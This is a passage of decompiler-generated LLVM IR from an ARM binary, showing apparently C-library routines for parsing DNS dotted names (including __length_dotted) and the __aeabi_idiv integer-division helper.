  %v6_1733448 = phi i32 [ %v6_173344361, %dec_label_pc_172b8.lr.ph ], [ %v6_17334, %bb30 ]
  %v1_1733447 = phi i32 [ %v1_173343960, %dec_label_pc_172b8.lr.ph ], [ %v5_172e0, %bb30 ]
  %v1_172bc = and i32 %v6_1733448, 192
  br i1 %v2_1734050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_172b8
  %v1_172c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_172c0 = add i32 %v1_172c0, 1
  store i32 %v2_172c0, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_172b8, %bb
  %v2_172c4 = icmp eq i32 %v1_172bc, 192
  %v1_172c8 = add i32 %v1_1733447, 1
  store i32 %v1_172c8, i32* @r5, align 4
  br i1 %v2_172c4, label %dec_label_pc_172d0, label %dec_label_pc_172f0

dec_label_pc_172d0:                               ; preds = %bb28
  %v2_172d0 = add i32 %v1_172c8, %v0_172d0.ph59
  %v3_172d0 = inttoptr i32 %v2_172d0 to i8*
  %v4_172d0 = load i8, i8* %v3_172d0, align 1
  %v6_172d0 = zext i8 %v4_172d0 to i32
  %v1_172d8 = urem i32 %v6_1733448, 64
  br i1 %v2_1734050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_172d0
  %v1_172dc = load i32, i32* %r8.global-to-local, align 4
  %v2_172dc = add i32 %v1_172dc, 1
  store i32 %v2_172dc, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_172d0, %bb29
  %v4_172e0 = mul nuw nsw i32 %v1_172d8, 256
  %v5_172e0 = or i32 %v6_172d0, %v4_172e0
  store i32 %v5_172e0, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_17334 = add i32 %v5_172e0, %v0_172d0.ph59
  %v3_17334 = inttoptr i32 %v2_17334 to i8*
  %v4_17334 = load i8, i8* %v3_17334, align 1
  %v6_17334 = zext i8 %v4_17334 to i32
  store i32 %v6_17334, i32* @r4, align 4
  %v2_17338 = icmp eq i8 %v4_17334, 0
  br i1 %v2_17338, label %dec_label_pc_17340.bb36_crit_edge, label %dec_label_pc_172b8

dec_label_pc_172f0:                               ; preds = %bb28
  %v2_172f0 = add i32 %v6_1733448, %storemerge17.ph58
  store i32 %v2_172f0, i32* %r6.global-to-local, align 4
  %v2_172f4 = load i32, i32* %stack_var_-40, align 4
  %v1_172f8 = add i32 %v2_172f0, 1
  store i32 %v1_172f8, i32* %r7.global-to-local, align 4
  %v3_172fc = icmp ult i32 %v1_172f8, %v2_172f4
  br i1 %v3_172fc, label %dec_label_pc_17304, label %dec_label_pc_17354

dec_label_pc_17304:                               ; preds = %dec_label_pc_172f0
  %v2_17304 = add i32 %v1_172c8, %v0_172d0.ph59
  store i32 %v2_17304, i32* @r1, align 4
  %v0_17308 = load i32, i32* %sb.global-to-local, align 4
  %v2_17308 = add i32 %v0_17308, %storemerge17.ph58
  store i32 %v2_17308, i32* @r0, align 4
  store i32 %v6_1733448, i32* @r2, align 4
  %v0_17310 = call i32 @memcpy()
  %v0_17314 = load i32, i32* @r5, align 4
  %v1_17314 = load i32, i32* @r4, align 4
  %v2_17314 = add i32 %v1_17314, %v0_17314
  store i32 %v2_17314, i32* %r1.global-to-local, align 4
  %v0_17318 = load i32, i32* %sl.global-to-local, align 4
  %v2_17318 = add i32 %v0_17318, %v2_17314
  %v3_17318 = inttoptr i32 %v2_17318 to i8*
  %v4_17318 = load i8, i8* %v3_17318, align 1
  %v0_1731c = load i32, i32* %fp.global-to-local, align 4
  %v2_1731c = icmp eq i32 %v0_1731c, 0
  br i1 %v2_1731c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_17304
  %v1_17320 = load i32, i32* %r8.global-to-local, align 4
  %v3_17320 = add i32 %v1_17320, %v1_17314
  store i32 %v3_17320, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_17304, %bb31
  %v2_17324 = icmp eq i8 %v4_17318, 0
  br i1 %v2_17324, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1732c.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1732c = load i32, i32* %sb.global-to-local, align 4
  %v3_1732c = load i32, i32* %r6.global-to-local, align 4
  %v4_1732c = add i32 %v3_1732c, %v2_1732c
  %v5_1732c = inttoptr i32 %v4_1732c to i8*
  store i8 %v0_1732c.off0, i8* %v5_1732c, align 1
  %v0_17330.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_17334.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17340.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1733439 = load i32, i32* %r1.global-to-local, align 4
  %v2_1733440 = add i32 %v1_1733439, %v0_17334.pre.pre
  %v3_1733441 = inttoptr i32 %v2_1733440 to i8*
  %v4_1733442 = load i8, i8* %v3_1733441, align 1
  %v6_1733443 = zext i8 %v4_1733442 to i32
  store i32 %v6_1733443, i32* @r4, align 4
  %v2_1733844 = icmp eq i8 %v4_1733442, 0
  %v2_1734046 = icmp eq i32 %v0_17340.pre.pre, 0
  br i1 %v2_1733844, label %dec_label_pc_17340, label %dec_label_pc_172b8.lr.ph

dec_label_pc_172b8.lr.ph:                         ; preds = %dec_label_pc_17334.preheader, %bb34
  %v2_173404663 = phi i1 [ %v2_1734046, %bb34 ], [ false, %dec_label_pc_17334.preheader ]
  %v6_173344361 = phi i32 [ %v6_1733443, %bb34 ], [ %v6_173344356, %dec_label_pc_17334.preheader ]
  %v1_173343960 = phi i32 [ %v1_1733439, %bb34 ], [ %v1_173343952, %dec_label_pc_17334.preheader ]
  %v0_172d0.ph59 = phi i32 [ %v0_17334.pre.pre, %bb34 ], [ %v0_17294, %dec_label_pc_17334.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_17330.pre, %bb34 ], [ 0, %dec_label_pc_17334.preheader ]
  br label %dec_label_pc_172b8

dec_label_pc_17340:                               ; preds = %bb34
  br i1 %v2_1734046, label %dec_label_pc_17340.bb36_crit_edge, label %bb35

dec_label_pc_17340.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_17340
  %v0_17348.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17354

bb35:                                             ; preds = %dec_label_pc_17334.preheader, %dec_label_pc_17340
  %v1_17344 = load i32, i32* %r8.global-to-local, align 4
  %v2_17344 = add i32 %v1_17344, 1
  store i32 %v2_17344, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17354

dec_label_pc_17354:                               ; preds = %dec_label_pc_172f0, %bb35, %dec_label_pc_17340.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_17348.pre, %dec_label_pc_17340.bb36_crit_edge ], [ %v2_17344, %bb35 ], [ -1, %dec_label_pc_172f0 ]
  store i32 %v3_17290, i32* @r4, align 4
  store i32 %v6_17290, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_172d0.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_17334, { 1, 0 }
  uselistorder i32 %v5_172e0, { 0, 2, 1 }
  uselistorder i32 %v6_1733448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1734050, { 1, 0 }
  uselistorder i32 %v0_17294, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i1 false, { 0, 8, 40, 36, 41, 42, 43, 44, 45, 2, 75, 4, 46, 13, 47, 48, 49, 12, 50, 51, 53, 54, 55, 56, 57, 58, 59, 52, 15, 60, 28, 16, 29, 61, 62, 63, 18, 17, 9, 10, 64, 65, 66, 11, 19, 67, 30, 31, 68, 32, 33, 20, 37, 38, 5, 21, 69, 34, 35, 70, 71, 14, 22, 72, 73, 74, 39, 76, 1, 25, 24, 26, 23, 6, 7, 27, 3, 77 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 11, 10, 19, 3, 9, 8, 7, 2, 17, 16, 1, 0, 18, 6, 15, 14, 13, 20, 12, 5, 4 }
  uselistorder i32 64, { 0, 8, 4, 5, 6, 1, 2, 11, 12, 7, 3, 9, 10, 13 }
  uselistorder i32* @r3, { 11, 0, 12, 13, 3, 4, 14, 5, 6, 7, 8, 1, 2, 17, 20, 18, 19, 15, 9, 10, 16, 21 }
  uselistorder i32* @r2, { 78, 79, 9, 80, 81, 82, 83, 10, 23, 24, 25, 84, 85, 86, 87, 11, 51, 88, 97, 98, 99, 100, 44, 12, 6, 130, 131, 132, 133, 52, 53, 2, 54, 55, 56, 90, 91, 7, 57, 14, 15, 134, 3, 135, 140, 141, 145, 116, 37, 38, 39, 40, 41, 136, 118, 122, 123, 126, 124, 125, 119, 120, 121, 27, 115, 13, 101, 142, 45, 58, 59, 60, 89, 1, 143, 5, 144, 61, 62, 63, 64, 8, 65, 66, 4, 67, 0, 68, 92, 93, 94, 95, 69, 70, 96, 16, 17, 26, 137, 138, 139, 28, 29, 30, 31, 32, 33, 34, 35, 36, 42, 43, 46, 47, 48, 49, 50, 71, 72, 73, 74, 75, 18, 19, 20, 21, 22, 76, 77, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 117, 127, 128, 129 }
  uselistorder i32* @r5, { 171, 172, 173, 174, 175, 176, 177, 8, 178, 179, 180, 181, 182, 183, 184, 5, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 26, 37, 9, 3, 38, 201, 211, 202, 203, 204, 22, 216, 212, 213, 214, 215, 217, 218, 219, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 10, 104, 105, 220, 224, 11, 226, 225, 4, 227, 12, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 256, 255, 24, 257, 87, 88, 89, 90, 91, 92, 293, 294, 106, 107, 108, 109, 110, 111, 112, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 113, 114, 0, 115, 116, 117, 118, 119, 120, 307, 308, 309, 310, 1, 311, 312, 313, 50, 51, 52, 53, 54, 55, 39, 40, 41, 42, 43, 44, 45, 169, 13, 7, 170, 46, 47, 56, 57, 58, 59, 60, 61, 62, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 63, 64, 65, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 278, 279, 14, 280, 315, 316, 317, 318, 121, 15, 122, 123, 124, 269, 270, 271, 272, 273, 274, 205, 206, 207, 208, 209, 210, 125, 16, 126, 127, 128, 129, 130, 17, 230, 231, 232, 18, 228, 229, 66, 67, 68, 233, 234, 235, 131, 132, 27, 133, 134, 19, 135, 136, 137, 138, 139, 140, 25, 141, 142, 143, 144, 28, 148, 20, 149, 150, 151, 152, 153, 154, 155, 156, 6, 157, 158, 159, 160, 161, 162, 35, 36, 145, 2, 146, 147, 49, 48, 23, 319, 320, 236, 237, 238, 239, 21, 240, 241, 163, 164, 165, 166, 167, 168, 221, 222, 223, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 314, 79, 80, 81, 82, 83, 84, 85, 86, 29, 30, 31, 32, 33, 34, 275, 276, 277 }
  uselistorder label %dec_label_pc_17354, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_17340.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_172b8.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_17360 = load i32, i32* @r0, align 4
  store i32 %v0_17360, i32* @lr, align 4
  %v2_17360 = icmp eq i32 %v0_17360, 0
  br i1 %v2_17360, label %bb, label %dec_label_pc_17378

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_17370:                               ; preds = %dec_label_pc_17380
  %v1_17370 = add i32 %v1_17388, 2
  br label %dec_label_pc_173a0

dec_label_pc_17378:                               ; preds = %entry
  %v0_17378 = load i32, i32* @r1, align 4
  br label %dec_label_pc_17388

dec_label_pc_17380:                               ; preds = %dec_label_pc_17388
  %v2_17398 = add i32 %v6_17388, %v1_1738c
  %v2_17380 = icmp eq i32 %v1_17394, 192
  br i1 %v2_17380, label %dec_label_pc_17370, label %dec_label_pc_17388

dec_label_pc_17388:                               ; preds = %dec_label_pc_17380, %dec_label_pc_17378
  %v1_17388 = phi i32 [ %v2_17398, %dec_label_pc_17380 ], [ %v0_17378, %dec_label_pc_17378 ]
  %v2_17388 = add i32 %v1_17388, %v0_17360
  %v3_17388 = inttoptr i32 %v2_17388 to i8*
  %v4_17388 = load i8, i8* %v3_17388, align 1
  %v6_17388 = zext i8 %v4_17388 to i32
  %v1_1738c = add i32 %v1_17388, 1
  %v2_17390 = icmp eq i8 %v4_17388, 0
  %v1_17394 = and i32 %v6_17388, 192
  store i32 %v1_17394, i32* @ip, align 4
  br i1 %v2_17390, label %dec_label_pc_173a0, label %dec_label_pc_17380

dec_label_pc_173a0:                               ; preds = %dec_label_pc_17388, %dec_label_pc_17370
  %v1_173a0 = phi i32 [ %v1_17370, %dec_label_pc_17370 ], [ %v1_1738c, %dec_label_pc_17388 ]
  %v2_173a0 = sub i32 %v1_173a0, %v0_17378
  ret i32 %v2_173a0

; uselistorder directives
  uselistorder i32 %v1_17394, { 1, 0 }
  uselistorder i32 %v6_17388, { 1, 0 }
  uselistorder i32 %v1_17388, { 2, 1, 0 }
  uselistorder i32 %v0_17360, { 0, 2, 1 }
  uselistorder i32* @ip, { 48, 49, 50, 51, 57, 52, 53, 54, 55, 58, 59, 60, 62, 61, 64, 8, 16, 65, 66, 67, 68, 69, 70, 71, 72, 17, 5, 19, 20, 21, 22, 73, 74, 76, 77, 78, 107, 18, 24, 23, 1, 25, 26, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 27, 28, 29, 30, 31, 32, 33, 34, 168, 9, 10, 0, 11, 12, 13, 14, 15, 110, 111, 7, 112, 6, 113, 79, 80, 81, 82, 83, 84, 98, 99, 162, 56, 102, 103, 4, 104, 105, 101, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 63, 166, 163, 164, 165, 2, 167, 35, 36, 37, 38, 39, 3, 40, 41, 42, 43, 44, 45, 75, 46, 161, 47, 100, 106, 108, 109, 116, 115, 114, 117, 118 }
  uselistorder i8 0, { 66, 17, 25, 26, 67, 16, 22, 68, 48, 72, 70, 47, 71, 69, 46, 40, 9, 10, 73, 74, 78, 79, 24, 62, 63, 75, 76, 77, 15, 80, 41, 49, 82, 0, 81, 50, 42, 83, 84, 85, 86, 87, 88, 11, 53, 92, 1, 90, 89, 51, 2, 91, 52, 3, 93, 94, 27, 4, 96, 95, 54, 97, 98, 99, 100, 43, 44, 102, 103, 101, 12, 13, 14, 104, 5, 28, 105, 18, 106, 107, 19, 64, 29, 30, 6, 108, 109, 110, 112, 113, 114, 115, 111, 45, 116, 117, 118, 119, 120, 20, 31, 32, 33, 34, 35, 36, 23, 7, 8, 122, 121, 37, 123, 124, 38, 125, 55, 21, 126, 127, 128, 129, 131, 56, 132, 133, 130, 134, 135, 136, 137, 139, 138, 140, 65, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 152, 151, 153, 57, 155, 154, 39, 156, 58, 157, 159, 160, 158, 59, 161, 162, 61, 163, 60, 164, 165, 166, 167, 168, 169, 170 }
  uselistorder i32 192, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32* @r1, { 77, 78, 1, 79, 80, 81, 84, 82, 83, 9, 10, 23, 85, 86, 87, 88, 89, 90, 91, 92, 3, 93, 94, 53, 95, 96, 97, 98, 101, 104, 105, 106, 107, 108, 109, 4, 45, 46, 12, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 6, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 5, 181, 182, 11, 99, 100, 54, 55, 56, 57, 58, 59, 60, 61, 62, 14, 20, 21, 183, 2, 184, 24, 25, 123, 34, 35, 186, 124, 129, 130, 133, 131, 132, 125, 126, 127, 128, 26, 185, 27, 15, 110, 116, 121, 120, 187, 188, 189, 16, 63, 64, 65, 17, 119, 18, 66, 111, 112, 113, 114, 115, 7, 8, 13, 67, 68, 69, 0, 70, 71, 72, 19, 102, 103, 73, 74, 22, 28, 29, 30, 31, 32, 33, 36, 37, 38, 39, 40, 41, 42, 43, 44, 47, 48, 49, 50, 51, 52, 75, 76, 117, 118, 122, 134 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_173a8 = icmp slt i32 %arg2, 0
  %v2_173a8 = icmp eq i32 %arg2, 0
  %v0_173ac = load i32, i32* @r0, align 4
  %v2_173ac = xor i32 %v0_173ac, %arg2
  br i1 %v2_173a8, label %dec_label_pc_174c0, label %dec_label_pc_173b4

dec_label_pc_173b4:                               ; preds = %entry
  br i1 %v1_173a8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_173b4
  %v2_173b4 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_173b4, %bb
  %v1_17480 = phi i32 [ %v2_173b4, %bb ], [ %arg2, %dec_label_pc_173b4 ]
  %v1_173b8 = add i32 %v1_17480, -1
  %v7_173b8 = icmp eq i32 %v1_17480, 1
  br i1 %v7_173b8, label %dec_label_pc_17460, label %dec_label_pc_173c0

dec_label_pc_173c0:                               ; preds = %thread-pre-split
  %v1_173c0 = icmp slt i32 %v0_173ac, 0
  br i1 %v1_173c0, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_173c0
  %v2_173c4 = sub i32 0, %v0_173ac
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_173c0, %bb85
  %v0_174b4 = phi i32 [ %v0_173ac, %dec_label_pc_173c0 ], [ %v2_173c4, %bb85 ]
  %v3_173c8 = icmp uge i32 %v0_174b4, %v1_17480
  %v9_173c8 = icmp eq i32 %v0_174b4, %v1_17480
  %v2_173cc = xor i1 %v3_173c8, true
  %v3_173cc = or i1 %v9_173c8, %v2_173cc
  br i1 %v3_173cc, label %dec_label_pc_1746c, label %dec_label_pc_173d0

dec_label_pc_173d0:                               ; preds = %bb86
  %v2_173d0 = and i32 %v1_173b8, %v1_17480
  %v4_173d0 = icmp eq i32 %v2_173d0, 0
  br i1 %v4_173d0, label %dec_label_pc_1747c, label %dec_label_pc_173d8

dec_label_pc_173d8:                               ; preds = %dec_label_pc_173d0
  %v3_173d8 = icmp ult i32 %v1_17480, 536870912
  br i1 %v3_173d8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_173d8
  %v4_173dc = mul i32 %v1_17480, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_173d8, %.thread
  %v0_173fc.pr40.ph = phi i32 [ %v4_173dc, %.thread ], [ %v1_17480, %dec_label_pc_173d8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_173d8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_173fc.pr40 = phi i32 [ %v4_173f0, %bb89 ], [ %v0_173fc.pr40.ph, %.preheader.preheader ]
  %v1_173f4 = phi i32 [ %v4_173f4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_173e8 = icmp ugt i32 %v0_173fc.pr40, 268435455
  br i1 %v2_173e8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_173fcthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_173ec = icmp ult i32 %v0_173fc.pr40, %v0_174b4
  br i1 %v4_173ec, label %bb88, label %dec_label_pc_173fcthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_173f0 = and i32 %v0_173fc.pr40, 268435456
  %v3_173f0 = icmp eq i32 %v2_173f0, 0
  %v4_173f0 = mul i32 %v0_173fc.pr40, 16
  br i1 %v3_173f0, label %bb89, label %dec_label_pc_173fc.loopexit

bb89:                                             ; preds = %bb88
  %v2_173f4 = and i32 %v1_173f4, 268435456
  %v3_173f4 = icmp eq i32 %v2_173f4, 0
  %v4_173f4 = mul i32 %v1_173f4, 16
  br i1 %v3_173f4, label %.preheader, label %dec_label_pc_173fcthread-pre-split.loopexit.loopexit

dec_label_pc_173fcthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1740852.ph = phi i32 [ %v1_173f4, %bb87 ], [ %v4_173f4, %bb89 ]
  %v0_173fc.pr42.ph = phi i32 [ %v0_173fc.pr40, %bb87 ], [ %v4_173f0, %bb89 ]
  br label %dec_label_pc_173fcthread-pre-split.loopexit

dec_label_pc_173fcthread-pre-split.loopexit:      ; preds = %dec_label_pc_173fcthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1740852 = phi i32 [ %v1_173f4, %.thread3 ], [ %v1_1740852.ph, %dec_label_pc_173fcthread-pre-split.loopexit.loopexit ]
  %v0_173fc.pr42 = phi i32 [ %v0_173fc.pr40, %.thread3 ], [ %v0_173fc.pr42.ph, %dec_label_pc_173fcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_173fcthread-pre-split

dec_label_pc_173fcthread-pre-split:               ; preds = %dec_label_pc_173fcthread-pre-split.loopexit, %bb91
  %v1_1740850 = phi i32 [ %v1_1740852, %dec_label_pc_173fcthread-pre-split.loopexit ], [ %v3_17408, %bb91 ]
  %v2_1740048 = phi i32 [ %v0_174b4, %dec_label_pc_173fcthread-pre-split.loopexit ], [ %v2_17400, %bb91 ]
  %v0_173fc.pr = phi i32 [ %v0_173fc.pr42, %dec_label_pc_173fcthread-pre-split.loopexit ], [ %v3_17404, %bb91 ]
  br label %dec_label_pc_173fc

dec_label_pc_173fc.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_173fc

dec_label_pc_173fc:                               ; preds = %dec_label_pc_173fc.loopexit, %dec_label_pc_173fcthread-pre-split
  %v1_17408 = phi i32 [ %v1_1740850, %dec_label_pc_173fcthread-pre-split ], [ %v1_173f4, %dec_label_pc_173fc.loopexit ]
  %v2_17400 = phi i32 [ %v2_1740048, %dec_label_pc_173fcthread-pre-split ], [ %v0_174b4, %dec_label_pc_173fc.loopexit ]
  %v1_17404 = phi i32 [ %v0_173fc.pr, %dec_label_pc_173fcthread-pre-split ], [ %v4_173f0, %dec_label_pc_173fc.loopexit ]
  %v2_173fc = icmp slt i32 %v1_17404, 0
  br i1 %v2_173fc, label %dec_label_pc_17410, label %bb90

bb90:                                             ; preds = %dec_label_pc_173fc
  %v4_17400 = icmp ult i32 %v1_17404, %v2_17400
  br i1 %v4_17400, label %bb91, label %dec_label_pc_17410

bb91:                                             ; preds = %bb90
  %v3_17404 = mul i32 %v1_17404, 2
  %v2_17408 = icmp slt i32 %v1_17408, 0
  %v3_17408 = mul i32 %v1_17408, 2
  br i1 %v2_17408, label %dec_label_pc_17410, label %dec_label_pc_173fcthread-pre-split

dec_label_pc_17410:                               ; preds = %bb90, %dec_label_pc_173fc, %bb91
  %v2_1741c63 = phi i32 [ %v3_17408, %bb91 ], [ %v1_17408, %bb90 ], [ %v1_17408, %dec_label_pc_173fc ]
  %v1_1741455 = phi i32 [ %v3_17404, %bb91 ], [ %v1_17404, %bb90 ], [ %v1_17404, %dec_label_pc_173fc ]
  br label %dec_label_pc_17414

dec_label_pc_17414:                               ; preds = %.thread13, %dec_label_pc_17410
  %v1_17448 = phi i32 [ %v4_17448, %.thread13 ], [ %v2_1741c63, %dec_label_pc_17410 ]
  %v1_1741c = phi i32 [ %v1_17458, %.thread13 ], [ 0, %dec_label_pc_17410 ]
  %v1_1744c = phi i32 [ %v4_1744c, %.thread13 ], [ %v1_1741455, %dec_label_pc_17410 ]
  %v1_17418 = phi i32 [ %v0_17444, %.thread13 ], [ %v0_174b4, %dec_label_pc_17410 ]
  %v3_17414 = icmp ult i32 %v1_17418, %v1_1744c
  br i1 %v3_17414, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_17414
  %v3_17418 = sub i32 %v1_17418, %v1_1744c
  %v3_1741c = or i32 %v1_1741c, %v1_17448
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17414, %bb92
  %v1_17424 = phi i32 [ %v1_17418, %dec_label_pc_17414 ], [ %v3_17418, %bb92 ]
  %v1_17428 = phi i32 [ %v1_1741c, %dec_label_pc_17414 ], [ %v3_1741c, %bb92 ]
  %v4_17420 = udiv i32 %v1_1744c, 2
  %v6_17420 = icmp ult i32 %v1_17424, %v4_17420
  br i1 %v6_17420, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_17424 = urem i32 %v1_1744c, 2
  %v4_17424 = icmp eq i32 %v3_17424, 0
  %v6_17424 = sub i32 %v1_17424, %v4_17420
  br i1 %v4_17424, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_17428 = udiv i32 %v1_17448, 2
  %v6_17428 = or i32 %v1_17428, %v5_17428
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_17430 = phi i32 [ %v6_17424, %bb93 ], [ %v1_17424, %.thread8 ], [ %v6_17424, %bb94 ]
  %v1_17434 = phi i32 [ %v1_17428, %bb93 ], [ %v1_17428, %.thread8 ], [ %v6_17428, %bb94 ]
  %v4_1742c = udiv i32 %v1_1744c, 4
  %v6_1742c = icmp ult i32 %v1_17430, %v4_1742c
  br i1 %v6_1742c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_17430 = and i32 %v1_1744c, 2
  %v4_17430 = icmp eq i32 %v3_17430, 0
  %v6_17430 = sub i32 %v1_17430, %v4_1742c
  br i1 %v4_17430, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_17434 = udiv i32 %v1_17448, 4
  %v6_17434 = or i32 %v1_17434, %v5_17434
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1743c = phi i32 [ %v6_17430, %bb95 ], [ %v1_17430, %.thread9 ], [ %v6_17430, %bb96 ]
  %v1_17440 = phi i32 [ %v1_17434, %bb95 ], [ %v1_17434, %.thread9 ], [ %v6_17434, %bb96 ]
  %v4_17438 = udiv i32 %v1_1744c, 8
  %v6_17438 = icmp ult i32 %v1_1743c, %v4_17438
  br i1 %v6_17438, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1743c = and i32 %v1_1744c, 4
  %v4_1743c = icmp eq i32 %v3_1743c, 0
  %v6_1743c = sub i32 %v1_1743c, %v4_17438
  br i1 %v4_1743c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_17440 = udiv i32 %v1_17448, 8
  %v6_17440 = or i32 %v1_17440, %v5_17440
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_17458 = phi i32 [ %v1_17440, %bb97 ], [ %v1_17440, %.thread10 ], [ %v6_17440, %bb98 ]
  %v0_17444 = phi i32 [ %v6_1743c, %bb97 ], [ %v1_1743c, %.thread10 ], [ %v6_1743c, %bb98 ]
  %v2_17444 = icmp eq i32 %v0_17444, 0
  br i1 %v2_17444, label %dec_label_pc_17454, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_17448, 16
  br i1 %tmp, label %dec_label_pc_17454, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_17448 = udiv i32 %v1_17448, 16
  %v4_1744c = udiv i32 %v1_1744c, 16
  br label %dec_label_pc_17414

dec_label_pc_17454:                               ; preds = %thread-pre-split12, %bb99
  %v1_17454 = icmp slt i32 %v2_173ac, 0
  br i1 %v1_17454, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_17454
  %v2_17458 = sub i32 0, %v1_17458
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_17460, %dec_label_pc_17454, %bb100
  %v1_1745c = phi i32 [ %v1_17458, %dec_label_pc_17454 ], [ %v2_17458, %bb100 ], [ %v0_173ac, %dec_label_pc_17460 ], [ %v2_17464, %bb101 ], [ %v1_1747880, %bb103 ], [ %v2_17474, %bb104 ]
  ret i32 %v1_1745c

dec_label_pc_17460:                               ; preds = %thread-pre-split
  br i1 %v1_173a8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_17460
  %v2_17464 = sub i32 0, %v0_173ac
  br label %.thread16

dec_label_pc_1746c:                               ; preds = %bb86
  br i1 %v3_173c8, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1746c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1746c, %bb102
